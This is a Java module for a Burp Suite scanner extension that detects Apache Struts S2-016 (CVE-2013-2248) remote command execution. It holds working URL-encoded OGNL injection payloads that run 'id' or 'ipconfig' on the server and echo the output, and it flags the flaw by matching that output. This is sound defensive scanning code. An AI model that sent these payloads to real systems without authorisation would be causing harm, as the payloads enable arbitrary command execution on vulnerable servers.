package burp.scan.issues.impl;

import burp.*;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.passive.Confidence;
import burp.scan.issues.IModule;
import burp.scan.lib.Risk;
import burp.scan.passive.CustomScanIssue;

import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import static burp.scan.lib.HTTPMatcher.isJavaApplicationByURL;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;

import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class ApacheStrutsS2016 implements IModule {

    private static final String TITLE = "Apache Struts S2-016 Injection - Remote Command Execution";
    private static final String DESCRIPTION = "J2EEscan identified a Remote Command Execution; "
            + "the Struts 2 DefaultActionMapper supports a "
            + "method for short-circuit navigation state changes by prefixing "
            + "parameters with <i>action:</i> or <i>redirect:</i>, "
            + "followed by a desired navigational target expression. "
            + "This mechanism was intended to help with attaching navigational "
            + "information to buttons within forms.<br /><br />"
            + "In Struts 2 before 2.3.15.1 the information following <i>action:</i>, <i>redirect:</i> "
            + "or <i>redirectAction:</i> is not properly sanitized. "
            + "<br /><br />Since said information will be evaluated as OGNL expression"
            + " against the value stack, this introduces the possibility to inject "
            + "server side code.<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://struts.apache.org/release/2.3.x/docs/s2-016.html<br />"
            + "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2248";

    private static final String REMEDY = "Update the remote Struts vulnerable library";

    private PrintWriter stderr;

    private static List<Pattern> DETECTION_REGEX = new ArrayList();

    static {
        DETECTION_REGEX.add(Pattern.compile("Subnet Mask", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
        DETECTION_REGEX.add(Pattern.compile("uid=[0-9]+.*gid=[0-9]+.*", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE));
        DETECTION_REGEX.add(Pattern.compile("java\\.lang\\.(UNIX)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
    }

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint, WebPageInfo webInfo) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);

        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        URL curURL = reqInfo.getUrl();

        byte[] modifiedRawRequest = null;
        List<IScanIssue> issues = new ArrayList<>();

        if (!isJavaApplicationByURL(curURL)) {
            return issues;
        }

        List<String> redirectMeth = new ArrayList();
        redirectMeth.add("action:");
        redirectMeth.add("redirect:");
        redirectMeth.add("redirectAction:");

        List<String> payloads = new ArrayList();
        payloads.add("${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27id%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}");
        payloads.add("${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cmd.exe%27,%27/c%20ipconfig.exe%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}");

        for (String redir : redirectMeth) {
            for (String payload : payloads) {

                try {
                    byte[] rawrequest = baseRequestResponse.getRequest();
                    List<IParameter> parameters = reqInfo.getParameters();

                    //Remove URI parameters
                    for (IParameter param : parameters) {
                        rawrequest = callbacks.getHelpers().removeParameter(rawrequest, param);
                    }

                    rawrequest = callbacks.getHelpers().addParameter(rawrequest,
                            callbacks.getHelpers().buildParameter(redir, payload, IParameter.PARAM_URL)
                    );

                    //TODO Fix me hack
                    String utf8rawRequest = new String(rawrequest, "UTF-8");
                    modifiedRawRequest = utf8rawRequest.replaceFirst("=", "").getBytes();

                    // make a request containing our injection test in the insertion point
                    IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                            baseRequestResponse.getHttpService(), modifiedRawRequest);

                    //get the body of the response
                    byte[] responseBytes = checkRequestResponse.getResponse();
                    String response = helpers.bytesToString(responseBytes);

                    IResponseInfo modifiedResponseInfo = callbacks.getHelpers().analyzeResponse(responseBytes);

                    // check the pattern on response body
                    for (Pattern detectionRule : DETECTION_REGEX) {

                        Matcher matcher = detectionRule.matcher(response);
                        if (matcher.find()) {
                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    reqInfo.getUrl(),
                                    checkRequestResponse,
                                    TITLE,
                                    DESCRIPTION,
                                    REMEDY,
                                    Risk.High,
                                    Confidence.Certain
                            ));
                            return issues;
                        }
                    }

                    // check the unix process string in every header 
                    for (String header : modifiedResponseInfo.getHeaders()) {

                        for (Pattern detectionRule : DETECTION_REGEX) {
                            Matcher matcher = detectionRule.matcher(header.toLowerCase());

                            if (matcher.find()) {
                                issues.add(new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        reqInfo.getUrl(),
                                        checkRequestResponse,
                                        TITLE,
                                        DESCRIPTION,
                                        REMEDY,
                                        Risk.High,
                                        Confidence.Certain));
                                return issues;
                            }
                        }
                    }

                } catch (UnsupportedEncodingException ex) {
                    stderr.println(ex);
                }
            }
        }
        return issues;
    }
}
